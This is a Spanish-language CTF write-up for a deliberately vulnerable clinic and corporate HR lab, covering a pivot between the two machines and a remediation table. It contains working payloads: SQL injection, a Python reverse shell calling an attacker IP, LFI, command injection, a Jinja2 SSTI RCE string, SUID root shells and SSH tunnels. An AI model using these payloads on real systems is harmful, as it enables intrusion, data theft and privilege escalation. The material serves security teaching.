<div align="center">

# 🏴‍☠️ Writeup — Laboratorio CTF
## Clínica San Clemente → Sistema Corporativo

**Categoría:** Web · Pivoting · Privilege Escalation
**Dificultad:** ⭐⭐⭐ Media
**Objetivo:** Comprometer la red interna pivotando desde el portal público hasta `root` en el servidor corporativo.

</div>

---

## 📑 Tabla de Contenidos

1. [Resumen ejecutivo](#-resumen-ejecutivo)
2. [Topología de red](#-topología-de-red)
3. [Reconocimiento](#-1-reconocimiento)
4. [Máquina 1 — Clínica San Clemente (Pivot)](#-2-máquina-1--clínica-san-clemente)
   - [2.1 SQL Injection](#21-sql-injection--bypass-de-login)
   - [2.2 Unrestricted File Upload (RCE)](#22-file-upload--rce)
   - [2.3 Local File Inclusion](#23-local-file-inclusion-lfi)
   - [2.4 Privesc con busybox SUID](#24-escalada-de-privilegios--busybox-suid)
5. [Pivoting hacia la red interna](#-3-pivoting-hacia-la-red-interna)
6. [Máquina 2 — Sistema Corporativo (Target final)](#-4-máquina-2--sistema-corporativo)
   - [4.1 Command Injection](#41-command-injection)
   - [4.2 IDOR](#42-idor--liquidaciones-de-sueldo)
   - [4.3 SSTI (RCE)](#43-ssti--server-side-template-injection)
   - [4.4 Privesc con bash SUID](#44-escalada-de-privilegios--bash-suid)
7. [Cadena completa de ataque](#-5-cadena-completa-de-ataque)
8. [Remediación](#-6-remediación)

---

## 🎯 Resumen ejecutivo

> El atacante parte desde internet con acceso únicamente al portal web de la **Clínica San Clemente**. Mediante una cadena de vulnerabilidades web logra ejecución de comandos, escala a `root`, y usa esa máquina como **pivote** para alcanzar el **Sistema Corporativo** (RRHH) que vive en una red interna aislada. Allí repite el proceso hasta exfiltrar datos sensibles y obtener `root`.

| # | Máquina | Vulnerabilidad | Impacto |
|---|---------|----------------|---------|
| 1 | Clínica | SQL Injection | Bypass de autenticación admin |
| 2 | Clínica | Unrestricted File Upload | RCE |
| 3 | Clínica | Local File Inclusion | Lectura de archivos del sistema |
| 4 | Clínica | busybox SUID | Escalada a `root` |
| 5 | Corporativo | Command Injection | RCE |
| 6 | Corporativo | IDOR | Fuga de datos (sueldos, cuentas bancarias) |
| 7 | Corporativo | SSTI (Jinja2) | RCE |
| 8 | Corporativo | bash SUID | Escalada a `root` |

---

## 🌐 Topología de red

```
                    ┌──────────────┐
   INTERNET / HOST  │   Atacante   │
                    └──────┬───────┘
                           │  :8080 web   :2222 ssh
                           ▼
        ╔══════════════════════════════════════╗
        ║   🏥 MÁQUINA 1 — CLÍNICA (Pivot)     ║
        ║                                      ║
        ║   red_publica  ◄── expuesta          ║
        ║   red_interna  ◄── puente al target  ║
        ╚════════════════╤═════════════════════╝
                         │   (red_interna: internal: true)
                         │   ❌ inalcanzable desde el host
                         ▼
        ╔══════════════════════════════════════╗
        ║   🏢 MÁQUINA 2 — CORPORATIVO (Target)║
        ║                                      ║
        ║   red_interna  ◄── SIN puertos pub.  ║
        ╚══════════════════════════════════════╝
```

**Clave del laboratorio:** la red interna está marcada como `internal: true` en
Docker. La Máquina 2 **no expone puertos al host**. La única forma de llegar a
ella es comprometiendo primero la Clínica y usándola como **pivote**.

---

## 🔍 1. Reconocimiento

Escaneo de los puertos publicados por el host:

```bash
$ nmap -sV -p- localhost
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH        # mapeado a 2222
5000/tcp open  http    Werkzeug/Flask # mapeado a 8080
```

Navegamos al portal:

```bash
$ curl -s http://localhost:8080 | grep -i title
<title>Clinica San Clemente</title>
```

Identificamos las secciones:

| Ruta | Función | Sospecha |
|------|---------|----------|
| `/` | Home | — |
| `/agendar` | Agendar hora | Input a BD |
| `/recetas` | Visor de recetas | 🚩 parámetro `?file=` |
| `/admin/login` | Login admin | 🚩 autenticación |

---

## 🏥 2. Máquina 1 — Clínica San Clemente

### 2.1 SQL Injection — Bypass de login

El login concatena el input directamente en la consulta SQL:

```python
# app.py (vulnerable)
query = "SELECT * FROM admins WHERE username = '%s' AND password = '%s'" % (usuario, clave)
cur.execute(query)
```

**Explotación** — en `http://localhost:8080/admin/login`:

```
Usuario:  admin' OR 1=1--
Password: (cualquier cosa)
```

La consulta resultante se convierte en:

```sql
SELECT * FROM admins WHERE username = 'admin' OR 1=1--' AND password = '...'
```

El `OR 1=1` siempre es verdadero y `--` comenta el resto. ✅ **Sesión de admin obtenida.**

> 🏁 Acceso al panel `/admin` sin conocer la contraseña.

---

### 2.2 File Upload → RCE

Dentro del panel, la sección **"Subir Exámenes"** guarda el archivo con su
nombre original, sin validar extensión ni contenido:

```python
# app.py (vulnerable)
destino = os.path.join(UPLOAD_DIR, archivo.filename)
archivo.save(destino)   # se acepta .py, .sh, lo que sea
```

**Explotación** — preparamos una reverse shell en Python:

```python
# shell.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.5",4444))            # IP del atacante
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

Levantamos el listener y subimos:

```bash
# atacante
$ nc -lvnp 4444

# subir shell.py vía la web (/admin/examenes) y ejecutarlo
$ curl http://localhost:8080/uploads/shell.py        # queda accesible
```

> 💡 Alternativa más directa en este lab: ya tenemos credenciales SSH
> (`clinica_user:clinica123`), así que el upload sirve para demostrar el RCE,
> pero el acceso interactivo lo conseguimos por SSH en el paso 2.4.

---

### 2.3 Local File Inclusion (LFI)

El visor de recetas concatena el parámetro `file` sin sanear el path:

```python
# app.py (vulnerable)
ruta = os.path.join(RECETAS_DIR, archivo)   # sin validar ../
open(ruta).read()
```

**Explotación:**

```bash
$ curl "http://localhost:8080/recetas?file=../../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
...
clinica_user:x:1000:1000::/home/clinica_user:/bin/bash
```

> 🏁 Confirmamos el usuario `clinica_user` y la presencia de `/bin/bash`.
> Útil también para leer código fuente, claves, configs, etc.

---

### 2.4 Escalada de privilegios — busybox SUID

Accedemos por SSH con las credenciales descubiertas:

```bash
$ ssh clinica_user@localhost -p 2222
# password: clinica123
```

Buscamos binarios con bit SUID:

```bash
$ find / -perm -4000 -type f 2>/dev/null
/bin/busybox        ◄── 🚩 ¡aquí está!
/usr/bin/passwd
...
```

`busybox` con SUID permite invocar una shell que **mantiene el euid 0**:

```bash
$ /bin/busybox sh
# id
uid=1000(clinica_user) euid=0(root) ...
# whoami
root
```

> 🏁🏁 **ROOT en la Máquina 1.** Referencia: [GTFOBins → busybox](https://gtfobins.github.io/gtfobins/busybox/#suid)

---

## 🔀 3. Pivoting hacia la red interna

Ya como `root` (o `clinica_user`) en la Clínica, enumeramos la red interna.
Docker resuelve los servicios por nombre:

```bash
# dentro de la Clínica
$ ping -c1 corporativo
PING corporativo (172.20.0.3) ...

$ curl -s http://corporativo:5000/ | grep -i title
<title>Intranet Corporativa</title>
```

El host **no** puede llegar a `corporativo` (red `internal: true`), pero la
Clínica sí. Montamos un túnel para atacar cómodamente desde nuestra máquina.

**Opción A — Port forwarding por SSH:**

```bash
# desde el atacante: exponer el :5000 interno de corporativo en nuestro :8000
$ ssh -L 8000:corporativo:5000 clinica_user@localhost -p 2222
# ahora http://localhost:8000 == intranet corporativa
```

**Opción B — Proxy SOCKS dinámico:**

```bash
$ ssh -D 1080 clinica_user@localhost -p 2222
$ curl --socks5-hostname localhost:1080 http://corporativo:5000/
```

> ✅ A partir de aquí tratamos `http://localhost:8000` como la intranet de RRHH.

---

## 🏢 4. Máquina 2 — Sistema Corporativo

### 4.1 Command Injection

La herramienta **"Estado de Red"** concatena el input en un comando de shell:

```python
# app.py (vulnerable)
comando = "ping -c 1 " + objetivo
subprocess.check_output(comando, shell=True)   # shell=True + concatenación
```

**Explotación** — en `/red`, campo objetivo:

```
127.0.0.1; id
```

Salida:

```
PING 127.0.0.1 ...
uid=1000(rrhh_user) gid=1000(rrhh_user) groups=1000(rrhh_user)
```

Otros payloads útiles:

```bash
8.8.8.8 && cat /etc/passwd
127.0.0.1; ls -la /app
127.0.0.1 | id
```

> 🏁 **RCE como `rrhh_user`.** Podemos lanzar una reverse shell desde aquí.

---

### 4.2 IDOR — Liquidaciones de sueldo

La vista de liquidaciones consulta por `id` **sin verificar** que pertenezca al
usuario autenticado:

```python
# app.py (vulnerable)
fila = conn.execute("SELECT * FROM liquidaciones WHERE id_empleado = ?", (id_empleado,)).fetchone()
# ❌ no comprueba quién es el solicitante
```

**Explotación** — iteramos el parámetro `id`:

```bash
$ curl "http://localhost:8000/liquidacion?id=1"   # Juan Perez
$ curl "http://localhost:8000/liquidacion?id=5"   # 🚩 Roberto King (CEO)
```

Resultado para `id=5`:

| Campo | Valor |
|-------|-------|
| Nombre | Roberto King |
| Sueldo líquido | $7.840.000 |
| Cuenta bancaria | 0099-0000-0001 |

> 🏁 **Fuga de datos sensibles** (sueldos y cuentas bancarias de todo el personal).

---

### 4.3 SSTI — Server-Side Template Injection

El buscador de empleados incrusta el input dentro de una plantilla Jinja2 que
se compila en el servidor:

```python
# app.py (vulnerable)
plantilla = "... Buscaste: %s ..." % q          # q entra al CÓDIGO de la plantilla
render_template_string(plantilla, resultados=...)
```

**Detección** — payload matemático:

```bash
$ curl "http://localhost:8000/empleados?q={{7*7}}"
... Buscaste: 49 ...        # ✅ se evaluó -> SSTI confirmado
```

**Explotación a RCE** — escapamos al objeto global de Python:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```bash
$ curl -G "http://localhost:8000/empleados" \
       --data-urlencode "q={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
...
uid=1000(rrhh_user) gid=1000(rrhh_user) ...
```

> 🏁 Segundo vector de **RCE como `rrhh_user`**. Referencia: [PayloadsAllTheThings → SSTI/Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

---

### 4.4 Escalada de privilegios — bash SUID

Con shell como `rrhh_user`, buscamos SUID:

```bash
$ find / -perm -4000 -type f 2>/dev/null
/bin/bash           ◄── 🚩
...
```

`bash -p` con SUID conserva los privilegios efectivos:

```bash
$ /bin/bash -p
bash-5.1# id
uid=1000(rrhh_user) euid=0(root) ...
bash-5.1# whoami
root
```

> 🏁🏁 **ROOT en la Máquina 2.** Referencia: [GTFOBins → bash](https://gtfobins.github.io/gtfobins/bash/#suid)
>
> 💡 Vector alternativo si estuviera `find` con SUID:
> ```bash
> find . -exec /bin/sh -p \; -quit
> ```

---

## ⛓️ 5. Cadena completa de ataque

```
┌─────────────┐
│  Atacante   │
└──────┬──────┘
       │ 1. SQLi  →  panel admin clínica
       │ 2. File Upload / SSH  →  shell clinica_user
       │ 3. busybox SUID  →  ROOT clínica  ✅
       ▼
┌─────────────────────┐
│  Clínica (Pivot)    │
└──────┬──────────────┘
       │ 4. SSH tunnel / SOCKS  →  red_interna
       │ 5. Command Injection / SSTI  →  shell rrhh_user
       │ 6. IDOR  →  exfiltración de datos
       │ 7. bash SUID  →  ROOT corporativo  ✅✅
       ▼
┌─────────────────────┐
│  Corporativo (GG)   │
└─────────────────────┘
```

**Flags conseguidas:**

- 🏁 Bypass de login (SQLi)
- 🏁 RCE en Clínica
- 🏁 ROOT en Clínica
- 🏁 Pivote a red interna
- 🏁 RCE en Corporativo
- 🏁 Exfiltración de datos (IDOR)
- 🏁 ROOT en Corporativo

---

## 🛡️ 6. Remediación

| Vulnerabilidad | Corrección |
|----------------|------------|
| **SQL Injection** | Usar consultas parametrizadas (`?` placeholders), nunca concatenar input. |
| **File Upload** | Validar extensión (whitelist), renombrar el archivo, guardar fuera del webroot, no servirlo como ejecutable. |
| **LFI** | Validar/normalizar el path (`os.path.realpath`), restringir a un directorio base, whitelist de nombres. |
| **Command Injection** | Evitar `shell=True`; pasar argumentos como lista (`subprocess.run(["ping","-c","1",ip])`) y validar la IP. |
| **IDOR** | Verificar autorización: el recurso solicitado debe pertenecer al usuario autenticado. |
| **SSTI** | Nunca pasar input del usuario a `render_template_string`. Usar plantillas estáticas con contexto. |
| **SUID innecesario** | Quitar el bit SUID de binarios que no lo requieran (`chmod u-s`). Principio de mínimo privilegio. |
| **Segmentación** | La red interna ya está aislada; reforzar con firewalls y monitoreo de tráfico lateral. |

---

<div align="center">

### ⚠️ Aviso

Este writeup describe un **entorno de laboratorio controlado e intencionalmente vulnerable**.
Las técnicas aquí mostradas son para **fines educativos y de hacking ético**.
Úsalas únicamente sobre sistemas que tengas **autorización explícita** para auditar.

**Happy Hacking 🏴‍☠️**

</div>
